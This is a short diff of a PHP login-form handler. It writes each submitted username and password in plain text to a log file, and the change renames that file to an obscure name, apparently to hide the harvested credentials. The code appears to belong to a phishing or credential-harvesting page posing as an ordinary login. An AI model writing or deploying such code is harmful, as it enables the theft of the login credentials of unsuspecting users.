@@ -12,7 +12,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     }
 
     $log = "Username: $username\nPassword: $password\n$extra----------------------\n";
-    file_put_contents("login.txt", $log, FILE_APPEND);
+    file_put_contents("realysupersecretshitthatonlyicanaccess.txt", $log, FILE_APPEND);
 
     echo <<<HTML
 <!DOCTYPE html>
